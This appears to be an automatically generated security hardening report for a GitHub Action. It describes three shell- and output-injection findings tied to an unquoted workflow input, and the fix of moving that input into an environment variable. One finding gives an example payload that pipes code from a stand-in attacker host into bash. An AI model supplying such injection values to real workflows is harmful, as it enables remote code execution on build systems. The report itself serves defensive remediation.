<!-- markdownlint-disable -->

# Hardening Report: freckle--stack-action--generate-matrix/v5.7.31

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **freckle--stack-action--generate-matrix/v5.7.31** was hardened automatically. 3 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Rule (a) violation: The `run:` block on line 26 directly interpolates the expression `${{ inputs.find-options }}` into a shell command string: `find ${{ inputs.find-options }} -printf "%f"\n`. GitHub Actions substitutes this expression into the shell script before the shell parses it, so an attacker who controls the `find-options` input can inject arbitrary shell commands (e.g., by supplying a value like `. ; curl http://evil.com | bash #`). The value is also unquoted, compounding the risk.

Locations:

- `action.yml:26`

### github-env-injection (severity: high)

The `run:` block writes the output of `find ${{ inputs.find-options }} ...` directly to `$GITHUB_OUTPUT` (via a heredoc) without sanitizing the value with `printf '%s' ... | tr -d '\n\r'`. The `inputs.find-options` expression is interpolated directly into the shell command that produces the value written to `$GITHUB_OUTPUT`, meaning a newline embedded in the input can inject additional key=value pairs into the output file, potentially overwriting downstream step outputs.

Locations:

- `action.yml:26`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.find-options }}" appears directly in run: block of step "Generate"; move to env: map

Locations:

- `action.yml:26`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, github-env-injection, static-inline-injection

**Notes:**

Moved `${{ inputs.find-options }}` from the inline shell command to the step's `env:` block as `FIND_OPTIONS`. In the run script, used the xargs-based tokenization pattern (guarded with `if [ -n "$FIND_OPTIONS" ]`, then `while IFS= read -r -d '' t; do find_args+=("$t"); done < <(printf '%s' "$FIND_OPTIONS" | xargs printf '%s\0')`) to safely split the argument list into a bash array. The array is then passed to `find` as `"${find_args[@]}"`. This eliminates direct expression interpolation into the shell script, prevents shell injection, and prevents newline injection into $GITHUB_OUTPUT.

